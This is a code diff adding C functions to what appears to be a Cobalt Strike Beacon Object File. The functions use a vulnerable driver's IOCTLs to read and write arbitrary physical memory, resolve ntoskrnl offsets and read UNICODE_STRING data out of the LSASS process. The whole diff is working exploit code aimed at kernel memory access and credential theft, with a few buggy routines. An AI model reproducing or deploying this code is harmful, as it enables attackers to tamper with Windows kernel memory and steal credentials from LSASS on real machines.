@@ -65,3 +65,243 @@ char* GetWinBuildNumber()
 
     return g_BuildStr;
 }
+
+BOOL WriteByte(HANDLE hFile, ULONG_PTR PhysicalAddress, BYTE WriteValue)
+{
+    typedef struct _PHYSICAL_WRITE_REQUEST {
+        UINT64 PhysicalAddr;
+        BYTE Value;
+    } PHYSICAL_WRITE_REQUEST, * PPHYSICAL_WRITE_REQUEST;
+
+    PHYSICAL_WRITE_REQUEST request = { 0 };
+
+    int size = sizeof(PHYSICAL_WRITE_REQUEST);
+    DWORD bytesReturned = 0;
+    UINT32 physAddr = 0;
+
+    request.PhysicalAddr = PhysicalAddress;
+    request.Value = WriteValue;
+
+    BOOL result = DeviceIoControl(hFile,
+        TPWSAV_WRITE_IOCTL,
+        &request,
+        sizeof(request),
+        &request,
+        sizeof(request),
+        &bytesReturned,
+        NULL);
+
+    if (!result) {
+        BeaconPrintf(CALLBACK_OUTPUT, "DeviceIoControl failed: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+BOOL ReadByte(HANDLE hFile, ULONG_PTR PhysicalAddress, PBYTE ReadValue)
+{
+
+    typedef struct _PHYSICAL_READ_REQUEST {
+        UINT64 PhysicalAddr;
+        BYTE ReadValue;
+    } PHYSICAL_READ_REQUEST, * PPHYSICAL_READ_REQUEST;
+
+
+    PHYSICAL_READ_REQUEST request = { 0 };
+    int size = sizeof(PHYSICAL_READ_REQUEST);
+    DWORD bytesReturned = 0;
+    UINT32 physAddr = 0;
+
+    request.PhysicalAddr = PhysicalAddress;
+    bytesReturned = 0;
+
+    BOOL result = DeviceIoControl(hFile, TPWSAV_READ_IOCTL, &request, sizeof(request), &request, sizeof(request), &bytesReturned, NULL);
+    if (!result) {
+        BeaconPrintf(CALLBACK_OUTPUT, "DeviceIoControl failed: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    *ReadValue = request.ReadValue;
+
+    return TRUE;
+}
+
+unsigned char* ReadMultipleBytes(HANDLE hFile, int NumberOfBytesToRead, DWORD64 PhysicalAddress, BOOL Forwards)
+{
+    unsigned char* ByteArray = (unsigned char*)malloc(NumberOfBytesToRead * sizeof(unsigned char));
+    int j = 0;
+    BYTE ReadValue = 0;
+    if (Forwards)
+    {
+        for (DWORD64 i = PhysicalAddress; i < PhysicalAddress + NumberOfBytesToRead; i++)
+        {
+            ReadByte(hFile, i, &ReadValue);
+            ByteArray[j] = ReadValue;
+            j++;
+        }
+    }
+    else
+    {
+        for (DWORD64 i = PhysicalAddress + NumberOfBytesToRead - 1; i >= PhysicalAddress; i--)
+        {
+            ReadByte(hFile, i, &ReadValue);
+            ByteArray[j] = ReadValue;
+            j++;
+        }
+    }
+
+    return ByteArray;
+}
+
+DWORD64 ByteScan(HANDLE hFile, unsigned char* TargetByteArray, int MaxNumberOfBytesToRead, DWORD64 PhysicalAddress)
+{
+    //DEBUG_PRINT("Performing a byte scan starting at physical address 0x%llx\n", PhysicalAddress);
+
+    int ArraySize = sizeof(TargetByteArray) - 1;
+    int arrayCounter = 0;
+
+    unsigned char* InternalByteArray = (char*)malloc(ArraySize * sizeof(char));
+    DWORD PhysicalAddressWhereByteArrayFound = 0;
+    BYTE readByteValue = 0;
+
+    for (DWORD64 i = PhysicalAddress; i < PhysicalAddress + MaxNumberOfBytesToRead; i++)
+    {
+        ReadByte(hFile, i, &readByteValue);
+        InternalByteArray[arrayCounter] = readByteValue;
+
+        //printf("Target Byte: 0x%x\n", TargetByteArray[arrayCounter]);
+
+        if (arrayCounter == ArraySize - 1)
+        {
+            PhysicalAddressWhereByteArrayFound = i - ArraySize;
+            break;
+        }
+
+
+        if (TargetByteArray[arrayCounter] == 0x90)
+        {
+            arrayCounter++;
+        }
+        else if (InternalByteArray[arrayCounter] != TargetByteArray[arrayCounter])
+        {
+            arrayCounter = 0;
+        }
+        else
+        {
+            arrayCounter++;
+        }
+    }
+    free(InternalByteArray);
+
+    return PhysicalAddressWhereByteArrayFound;
+}
+
+
+// Very similar to the ReadMultipleBytes function but we need it to go backwards to read address correctly
+DWORD64 ReadAddressAtPhysicalAddressLocation(HANDLE hFile, DWORD64 PhysicalAddress)
+{
+    BYTE value = 0;
+    DWORD64 address = 0;
+    for (DWORD64 i = PhysicalAddress + 7; i >= PhysicalAddress; i--)
+    {
+        ReadByte(hFile, i, &value);
+        address = (address << 8);
+        address += value;
+    }
+    return address;
+}
+
+/*
+* TODO: Fix me!
+DWORD64 GetNtKernelVirtualAddresses(void)
+{
+    PVOID lpImageBase[2048];
+    DWORD cb = 2048;
+    DWORD lpcbNeeded;
+    BOOL bResult = EnumDeviceDrivers(lpImageBase, cb, &lpcbNeeded);
+    if (!bResult)
+    {
+        BeaconPrintf(CALLBACK_OUTPUT, "Error when calling EnumDeviceDrivers: 0x%lx\n", GetLastError());
+        return NULL;
+    }
+
+    int numberOfDevices = lpcbNeeded / sizeof(LPVOID);
+    //printf("Number of devices enumerated: %d\n", numberOfDevices);
+
+    DWORD64 NtVirtualBaseAddress = (DWORD64)lpImageBase[0]; // ntoskrnl.exe
+    //printf("[+] Ntoskrnl Virtual Address: 0x%llx\n", NtVirtualBaseAddress);
+    return NtVirtualBaseAddress;
+}
+*/
+
+// Used for getting EPROCESS structs eventually
+DWORD64 GetFunctionOffsetFromNtoskrnl(char* FunctionName)
+{
+    HMODULE Ntoskrnl = LoadLibraryA("ntoskrnl.exe");
+    DWORD64 GetFunctionOffset = (DWORD64)(GetProcAddress(Ntoskrnl, FunctionName)) - (DWORD64)Ntoskrnl;
+
+    //printf("[+] %s offset from Ntoskrnl base: 0x%llx\n", FunctionName, GetFunctionOffset);
+
+    FreeLibrary(Ntoskrnl);
+
+    return GetFunctionOffset;
+}
+
+wchar_t* ReadUnicodeStringFromPhysical(HANDLE hFile, DWORD64 UnicodeStringStructPA, DWORD lower32bits, int LsassPID)
+{
+    /*
+      typedef struct _UNICODE_STRING {
+      USHORT Length;         // Offset 0 (2 bytes)
+      USHORT MaximumLength;  // Offset 2 (2 bytes)
+                             // 4 bytes invisible padding
+      PWSTR  Buffer;         // Offset 8 (8 bytes)
+    } UNICODE_STRING, *PUNICODE_STRING;
+    */
+
+    // It is a UNICODE_STRING struct so we have to get the string length at the first byte, and the pointer to the string will start at 0x8
+
+    // Get length
+    BYTE UnicodeStringLength = 0;
+    ReadByte(hFile, UnicodeStringStructPA + 0x2, &UnicodeStringLength); // the 0x2 is to get the max length of the unicode string
+
+    // Get address to the wide string
+    DWORD64 UnicodeStringPA = 0;
+    DWORD64 pUnicodeStringVA = ReadAddressAtPhysicalAddressLocation(hFile, UnicodeStringStructPA + 0x8);
+    TranslateUVA2Physical(pUnicodeStringVA, &UnicodeStringPA, lower32bits, LsassPID);
+
+    // Read wide string & store string properly
+    wchar_t* UnicodeString = (wchar_t*)malloc(UnicodeStringLength * sizeof(wchar_t));
+    int j = 0;
+    BYTE ReadValueLow = 0;
+    BYTE ReadValueHigh = 0;
+    for (DWORD64 i = UnicodeStringPA; i < UnicodeStringPA + UnicodeStringLength; i += 2)
+    {
+        ReadByte(hFile, i, &ReadValueLow);
+        ReadByte(hFile, i + 1, &ReadValueHigh);
+        UnicodeString[j] = (wchar_t)(ReadValueLow | ReadValueHigh << 8);
+        j++;
+    }
+    UnicodeString[j] = L'\0';
+
+
+    return UnicodeString;
+}
+
+DWORD SearchPattern(unsigned char* mem, DWORD NumOfBytesToSearch, unsigned char* signature, DWORD signatureLen)
+{
+    ULONG offset = 0;
+
+    // Hunt for signature locally to avoid a load of RPM calls
+    for (int i = 0; i < NumOfBytesToSearch; i++) {
+        if (*(unsigned char*)(mem + i) == signature[0] && *(unsigned char*)(mem + i + 1) == signature[1]) {
+            if (memcmp(mem + i, signature, signatureLen) == 0) {
+                // Found the signature
+                offset = i;
+                break;
+            }
+        }
+    }
+
+    return offset;
+}
